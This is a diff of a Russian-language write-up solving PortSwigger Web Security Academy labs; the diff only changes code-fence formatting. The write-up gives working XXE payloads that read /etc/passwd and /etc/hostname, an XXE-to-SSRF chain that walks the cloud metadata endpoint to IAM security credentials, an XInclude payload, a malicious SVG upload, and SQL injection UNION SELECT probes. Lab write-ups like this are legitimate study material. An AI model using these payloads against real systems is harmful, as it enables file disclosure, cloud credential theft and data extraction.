@@ -9,9 +9,9 @@
 
 5) после объявления xml добавить
 
-'''xml
+```xml
 <!DOCTYPE kek [ <!ENTITY res SYSTEM "file:///etc/passwd"> ]> 
-'''
+```
 
 6)заменить product id число на &res; 
 
@@ -23,33 +23,33 @@
 
 5)после объявления xml добавить:
 
-'''xml
+```xml
 <!DOCTYPE kek [ <!ENTITY res SYSTEM "http://169.254.169.254/"> ]>
-'''
+```
 
 6)заменить product id на &res; отправить запрос, 
 
 7)в ответе придет latest - добавить его к адресу и получим 
 
-'''xml
+```xml
 <!DOCTYPE kek [ <!ENTITY res SYSTEM "http://169.254.169.254/latest"> ]> 
-'''
+```
 и так далее, 
 
 n+1)в итоге получаем 
-'''xml
+```xml
 <!DOCTYPE kek [ <!ENTITY res SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
-''', что и приведёт нас к ответу.
+```, что и приведёт нас к ответу.
 
 3. https://portswigger.net/web-security/xxe/lab-xinclude-attack
 
 те же действия, что и в 1. до пункта 4) 
 
 5)в *product id* вставить 
-'''xml
+```xml
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"> 
 <xi:include parse="text" href="file:///etc/passwd"/></foo> 
-'''
+```
 
 6)в ответ придёт /etc/passwd
 
@@ -63,7 +63,7 @@ n+1)в итоге получаем
 
 5)в поле для картинки вставить: 
 
-'''xml
+```xml
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <!DOCTYPE kek [ <!ENTITY res SYSTEM "file:///etc/hostname"> ]>
  <svg  version="1.1" width="1200" height="1200"
@@ -74,7 +74,7 @@ n+1)в итоге получаем
      xmlns:ev="http://www.w3.org/2001/xml-events">
  <text font-size = "10" y = "16"> &res; </text>
 </svg>
-'''
+```
 
 6)svg части взяты из интернета - видимо что-то типа стандарта,размер задан вручную, ViewBox регулировался так, чтоб было видно текст на картинке, собственно как и размер текста(тоже регулировался)
 
@@ -87,7 +87,7 @@ n+1)в итоге получаем
 
 1)в category использовать '+union+select+NULL,NULL,NULL - так убедимся, что у нас 3 столбца в таблице
 
-2)заменяем NULL по очереди на 'HmnfQ2' - дано в задании
+2)заменяем NULL по очереди на `HmnfQ2` - дано в задании
 https://ac811f101ea3312280cb0ad600a4009a.web-security-academy.net/filter?category=%27+UNION+SELECT+NULL,%27HmnfQ2%27,NULL-- 
 
 3)второй столбец оказался верным - выводится результат
